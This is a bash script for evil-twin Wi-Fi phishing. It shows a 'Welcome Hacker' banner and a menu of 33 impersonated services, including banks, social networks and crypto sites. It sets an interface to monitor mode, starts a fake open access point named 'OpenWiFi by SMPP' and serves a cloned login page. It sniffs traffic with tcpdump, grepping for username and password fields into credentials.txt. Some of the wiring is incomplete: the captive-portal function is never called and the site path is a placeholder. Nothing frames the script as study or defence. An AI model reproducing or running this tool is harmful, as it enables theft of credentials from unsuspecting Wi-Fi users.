#!/bin/bash

# Function to clear the terminal
clear_terminal() {
    clear
}

# Function to display the big welcome message
big_welcome() {
    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"
    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"
    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"
    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"
    echo -e "${RED}|  \`  '  ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"
    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"
    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
}

# Function to display the menu for phishing options
menu() {
    echo -e "Select phishing server option:"
    echo "1. Instagram"
    echo "2. Facebook"
    echo "3. Snapchat"
    echo "4. Twitter"
    echo "5. Github"
    echo "6. Google"
    echo "7. Spotify"
    echo "8. Netflix"
    echo "9. PayPal"
    echo "10. Origin"
    echo "11. Steam"
    echo "12. Yahoo"
    echo "13. Linkedin"
    echo "14. Protonmail"
    echo "15. Wordpress"
    echo "16. Microsoft"
    echo "17. InstaFollowers"
    echo "18. Shopping"
    echo "19. Pinterest"
    echo "20. CryptoCurrency"
    echo "21. Verizon"
    echo "22. DropBox"
    echo "23. Adobe"
    echo "24. Shopify"
    echo "25. Messenger"
    echo "26. GitLab"
    echo "27. Twitch"
    echo "28. MySpace"
    echo "29. Badoo"
    echo "30. VK"
    echo "31. Yandex"
    echo "32. DevianArt"
    echo "33. Custom"
    read -p "Enter your choice: " choice
    case $choice in
        1) server="instagram" ;;
        2) server="facebook" ;;
        3) server="snapchat" ;;
        4) server="twitter" ;;
        5) server="github" ;;
        6) server="google" ;;
        7) server="spotify" ;;
        8) server="netflix" ;;
        9) server="paypal" ;;
        10) server="origin" ;;
        11) server="steam" ;;
        12) server="yahoo" ;;
        13) server="linkedin" ;;
        14) server="protonmail" ;;
        15) server="wordpress" ;;
        16) server="microsoft" ;;
        17) server="instafollowers" ;;
        18) server="shopping" ;;
        19) server="pinterest" ;;
        20) server="cryptocurrency" ;;
        21) server="verizon" ;;
        22) server="dropbox" ;;
        23) server="adobe" ;;
        24) server="shopify" ;;
        25) server="messenger" ;;
        26) server="gitlab" ;;
        27) server="twitch" ;;
        28) server="myspace" ;;
        29) server="badoo" ;;
        30) server="vk" ;;
        31) server="yandex" ;;
        32) server="devianart" ;;
        33) server="custom" ;;
        *) echo "Invalid choice. Please try again." ;;
    esac
}

# Function for captive portal phishing
captive_portal_phishing() {
    echo "Captive Portal Phishing selected."
    select_interface
}

# Function to select network interface
select_interface() {
    echo "Select network interface:"
    interfaces=$(ifconfig -a | grep -oE "^[a-zA-Z0-9]+" | grep -v "lo")
    select interface in $interfaces; do
        if [ -n "$interface" ]; then
            echo "Selected interface: $interface"
            start_captive_portal "$interface"
            break
        else
            echo "Invalid selection. Please try again."
        fi
    done
}

# Function to start captive portal phishing
start_captive_portal() {
    interface=$1
    echo "Starting captive portal phishing on interface: $interface"
    # Set interface to monitor mode
    airmon-ng start $interface
    # Start fake AP
    airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface &
    sleep 5 # Wait for AP to start
    serve_login_page "$interface" &
    capture_credentials "$interface"
}

# Function to serve login page
serve_login_page() {
    interface=$1
    echo "Serving login page on interface: $interface"
    cd /var/www/html
    while true; do
        login_page=$(find /path/to/sites/$server -name "login.php" | head -n 1)
        if [ -n "$login_page" ]; then
            cp $login_page index.php
        fi
        sleep 5
    done
}

# Function to capture credentials
capture_credentials() {
    interface=$1
    echo "Capturing credentials on interface: $interface..."
    tcpdump -i $interface -A -s0 port http or port https | egrep -i "username=|password=|user=|pass=|login=|usr=|pwd=" > credentials.txt
}

# Main script starts here

# Clear the terminal
clear_terminal

# Display the big welcome message
big_welcome

# Start the phishing menu
menu
